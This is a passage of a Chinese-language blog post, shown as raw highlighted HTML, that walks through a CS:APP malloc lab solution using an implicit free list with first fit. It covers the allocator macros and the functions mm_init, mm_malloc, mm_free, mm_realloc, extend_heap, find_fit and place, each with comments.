punctuation">;</span><span class="token comment">// 如果新分配的内存大小 size 小于复制大小 copySize，则选择较小的值</span><span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">&lt;</span> copySize<span class="token punctuation">)</span>  copySize <span class="token operator">=</span> size<span class="token punctuation">;</span><span class="token comment">// 使用 memcpy 函数将原始指针 oldptr 的数据复制到新分配的内存区域 newptr</span><span class="token function">memcpy</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span> oldptr<span class="token punctuation">,</span> copySize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 释放原始的内存区域 oldptr</span><span class="token function">mm_free</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 返回新分配的内存区域 newptr</span><span class="token keyword">return</span> newptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1隐式空闲列表-First-Fit"><a href="#2-1隐式空闲列表-First-Fit" class="headerlink" title="2.1隐式空闲列表+First Fit"></a>2.1隐式空闲列表+First Fit</h3><p><strong>基本函数定义</strong></p><p>在编程中为了避免出现多次对(void*)dp指针的强转和引用(void *)指针不能间接引用，所以为了减轻负担以及多次的简洁使用，故采取多个宏定义减轻后期编写函数会出现的各种各样的负担。</p><p>书上给的函数定义，之后的编程会为了方便补充宏定义</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* $begin mallocmacros */</span><span class="token comment">/* Basic constants and macros */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">WSIZE</span>       <span class="token expression"><span class="token number">4</span>       </span><span class="token comment">/* Word and header/footer size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DSIZE</span>       <span class="token expression"><span class="token number">8</span>       </span><span class="token comment">/* Double word size (bytes) */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNKSIZE</span>  <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span><span class="token number">12</span><span class="token punctuation">)</span>  </span><span class="token comment">/* Extend heap by this amount (bytes) */</span>  </span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token operator">?</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>  </span></span> <span class="token comment">/* Pack a size and allocated bit into a word */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PACK</span><span class="token expression"><span class="token punctuation">(</span>size<span class="token punctuation">,</span> alloc<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//打包头部的值，再用PUT（p,PACK(size,alloc)),之类的函数把他丢进header/footer</span></span> <span class="token comment">/* Read and write a word at address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//获得p指向的值           </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PUT</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> val<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>    </span><span class="token comment">//写入val与p指向地址</span></span> <span class="token comment">/* Read the size and allocated fields from address p */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_SIZE</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">0x7</span><span class="token punctuation">)</span>                   </span><span class="token comment">//由于双字对齐条件约束，故释放最低三位，即得到的unsigned int 值</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_ALLOC</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">GET</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1</span><span class="token punctuation">)</span>                    </span><span class="token comment">//有无分配</span></span> <span class="token comment">/* Given block ptr bp, compute address of its header and footer */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">HDRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span>                      </span><span class="token comment">//the address of the header</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">FTRP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>       <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span> </span><span class="token comment">//the address of the footer</span></span> <span class="token comment">/* Given block ptr bp, compute address of next and previous blocks */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">NEXT_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//next blocks pointer</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PREV_BLKP</span><span class="token expression"><span class="token punctuation">(</span>bp<span class="token punctuation">)</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span> <span class="token operator">-</span> DSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> </span><span class="token comment">//prev blocks pointer</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>函数实现</strong></p><p>要实现的函数</p><ol><li>int mm_init(void)extend_heap</li></ol><p>初始化函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mm_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>heap_listp <span class="token operator">=</span> <span class="token function">mem_sbrk</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>DSIZE<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span>heap_listp<span class="token operator">+</span><span class="token number">3</span><span class="token operator">*</span>WSIZE<span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heap_listp<span class="token operator">+=</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">;</span><span class="token comment">//将heap_listp指针移到序言和结尾块之间</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>void *mm_malloc(size_t size)</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_malloc</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> extendsize<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">&lt;=</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>DSIZE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token punctuation">)</span>bp<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    extendsize <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//扩展堆</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bp <span class="token operator">=</span> <span class="token function">extend_heap</span> <span class="token punctuation">(</span>extendsize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>     <span class="token function">place</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> bp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>void mm_free(void *ptr)</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">mm_free</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">coalesce</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>void *mm_realloc(void *ptr, size_t size)</li></ol><p>重新组织内存，分配空间，统一调用free和malloc</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mm_realloc</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>oldptr<span class="token operator">=</span>ptr<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>newptr<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> new_size<span class="token punctuation">,</span>old_size<span class="token punctuation">,</span>extend_size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ptr<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token function">mm_malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>size<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">mm_free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    new_size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>size<span class="token operator">+</span>DSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    old_size<span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">>=</span>new_size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//只需要在原有空间上释放后面的一部分空间就可以了，其实可以直接用place语句替换ifelse</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>old_size<span class="token operator">-</span>new_size<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">place</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> oldptr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//太小了，只能释放内存，重新找一块新的</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">find_fit</span><span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        extend_size<span class="token operator">=</span><span class="token function">MAX</span><span class="token punctuation">(</span>new_size<span class="token punctuation">,</span>CHUNKSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>newptr<span class="token operator">=</span><span class="token function">extend_heap</span><span class="token punctuation">(</span>extend_size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">place</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>new_size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>newptr<span class="token punctuation">,</span>oldptr<span class="token punctuation">,</span>old_size<span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>WSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">mm_free</span><span class="token punctuation">(</span>oldptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> newptr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>static void *extend_heap(size_t words);</li></ol><p>扩展堆函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">extend_heap</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> words<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//扩展堆函数,开一个新的空闲块</span>    <span class="token keyword">void</span> <span class="token operator">*</span>bp<span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>    size<span class="token operator">=</span><span class="token function">ALIGN</span><span class="token punctuation">(</span>words<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充</span>   <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bp<span class="token operator">=</span><span class="token function">mem_sbrk</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//注意这个（void*)</span>   <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建一个新的结尾块</span>    <span class="token keyword">return</span> <span class="token function">coalesce</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开完后看能不能和前面的合并</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>static void <em>find_fit(size_t size);</em></li></ol><p>找空余空间</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">find_fit</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//在空闲块中看能否找到一个>=size的块，first fit</span>    <span class="token keyword">void</span> <span class="token operator">*</span>ffbp<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>ffbp<span class="token operator">=</span>heap_listp<span class="token punctuation">;</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>ffbp<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GET_ALLOC</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>ffbp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>=</span>size<span class="token punctuation">)</span>        <span class="token keyword">return</span> ffbp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="7"><li><em>static void place(char</em>bp,size_t size);</li></ol><p>分割函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span>  <span class="token keyword">void</span>  <span class="token function">place</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>bp<span class="token punctuation">,</span><span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">size_t</span> asize <span class="token operator">=</span><span class="token function">GET_SIZE</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> resize <span class="token operator">=</span>asize<span class="token operator">-</span>size<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>resize<span class="token operator">>=</span>MINBLOCK<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bp<span class="token operator">=</span><span class="token function">NEXT_BLKP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//后部分置为空</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>resize<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">HDRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">PUT</span><span class="token punctuation">(</span><span class="token function">FTRP</span><span class="token punctuation">(</span>bp<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">PACK</span><span class="token punctuation">(</span>asize<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 